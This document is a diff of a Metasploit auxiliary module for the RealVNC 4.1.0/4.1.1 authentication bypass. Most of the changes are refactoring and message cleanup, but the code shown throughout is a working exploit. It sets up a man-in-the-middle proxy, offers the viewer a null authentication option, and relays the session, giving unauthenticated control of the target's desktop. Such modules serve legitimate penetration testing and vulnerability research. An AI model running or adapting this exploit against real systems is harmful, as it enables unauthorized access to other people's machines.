@@ -17,14 +17,14 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'RealVNC Authentication Bypass',
+			'Name'           => 'RealVNC NULL Authentication Mode Bypass',
 			'Description'    => %q{
-				This module exploits an Authentication Bypass Vulnerability
+				This module exploits an Authentication bypass Vulnerability
 				in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
 				listener on LPORT and proxies to the target server
 
 				The AUTOVNC option requires that vncviewer be installed on 
-				the attacking machine. This option should be disabled for Pro
+				the attacking machine.
 			},
 			'Author'         => 
 				[
@@ -44,64 +44,64 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptAddress.new('RHOST', [true, 'The Target Host']),
 				OptPort.new('RPORT',    [true, "The port the target VNC Server is listening on", 5900 ]),
 				OptPort.new('LPORT',    [true, "The port the local VNC Proxy should listen on", 5900 ]),
-				OptBool.new('AUTOVNC',  [true, "Automatically Launch vncviewer from this host", true])
+				OptBool.new('AUTOVNC',  [true, "Automatically launch vncviewer from this host", false])
 			], self.class)
 	end
 
 	def run
-		#starts up the Listener Server
-		print_status("starting listener")
+		# starts up the Listener Server
+		print_status("Starting listener...")
 		listener = Rex::Socket::TcpServer.create(
-				'LocalHost' => '0.0.0.0',
-				'LocalPort' => datastore['LPORT'],
-				'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
-			)
+			'LocalHost' => '0.0.0.0',
+			'LocalPort' => datastore['LPORT'],
+			'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+		)
 
-		#If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
-		#targetting the proxy listener.
+		# If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
+		# targetting the proxy listener.
 		if (datastore['AUTOVNC'])
 			unless (check_vncviewer())
-				print_error("vncviewer does not appear to be installed, exiting!!!")
+				print_error("The vncviewer does not appear to be installed, exiting...")
 				return nil
 			end
-			print_status("Spawning viewer thread")	
+			print_status("Spawning viewer thread...")	
 			view = framework.threads.spawn("VncViewerWrapper", false) {
 					system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
 			}
 		end
 
-		#Establishes the connection between the viewier and the remote server
+		# Establishes the connection between the viewier and the remote server
 		client = listener.accept
 		add_socket(client)
+		
+		# Closes the listener socket as it is no longer needed
+		listener.close
 
-		s = Rex::Socket::Tcp.create(
-				'PeerHost' => datastore['RHOST'],
-				'PeerPort' => datastore['RPORT'],
-				'Timeout' => 1
-				)
-		add_socket(s)
-		serverhello = s.gets
+		s = connect
+
+		serverhello = s.get_once
 		unless serverhello.include? "RFB 003.008"
-			print_error("The VNCServer is not vulnerable")
+			print_error("The server is not vulnerable")
 			return
 		end
 
-		#MitM attack on the VNC Authentication Process
+		# MitM attack on the VNC Authentication Process
 		client.puts(serverhello)
-		clienthello = client.gets
+		clienthello = client.get_once
 		s.puts(clienthello)
-		authmethods = s.recv(2)
-		print_status("Auth Methods Recieved. Sending Null Authentication Option to Client")
+		
+		authmethods = s.read(2)
+		
+		print_status("Auth methods recieved. Sending null authentication option to client")
 		client.write("\x01\x01")
-		client.recv(1)
-		s.write("\x01")
-		s.recv(4)
-		client.write("\x00\x00\x00\x00")
+		client.read(1)
+		s.put("\x01")
+		s.read(4)
+		client.put("\x00\x00\x00\x00")
 
-		#handles remaining proxy operations between the two sockets
+		# Handles remaining proxy operations between the two sockets
 		closed = false
 		while(closed == false)
 			sockets =[]
@@ -110,30 +110,30 @@ class Metasploit3 < Msf::Auxiliary
 			selected = select(sockets,nil,nil,0)
 			#print_status ("Selected: #{selected.inspect}")
 			unless selected.nil?
+
 				if selected[0].include?(client)
-					#print_status("Transfering from client to server")
 					begin
-						data = client.sysread(8192)
+						data = client.get_once
 						if data.nil?
-							print_error("Client Closed Connection")
+							print_error("Client closed connection")
 							closed = true
 						else
-							s.write(data)
+							s.put(data)
 						end
 					rescue
-						print_error("Client Closed Connection")	
+						print_error("Client closed connection")	
 						closed = true
 					end
 				end
+				
 				if selected[0].include?(s)
-					#print_status("Transfering from server to client")
 					begin
-						data = s.sysread(8192)
+						data = s.get_once
 						if data.nil?
-							print_error("Server Closed Connection")
+							print_error("Server closed connection")
 							closed = true
 						else
-							client.write(data)
+							client.put(data)
 						end
 					rescue
 						closed = true
@@ -142,14 +142,12 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 
-		#Garbage Collection
+		# Close sockets
 		s.close
 		client.close
-		print_status("Listener Closed")
 
 		if (datastore['AUTOVNC'])
-			view.kill
-			print_status("Viewer Closed")
+			view.kill rescue nil
 		end
 	end
 
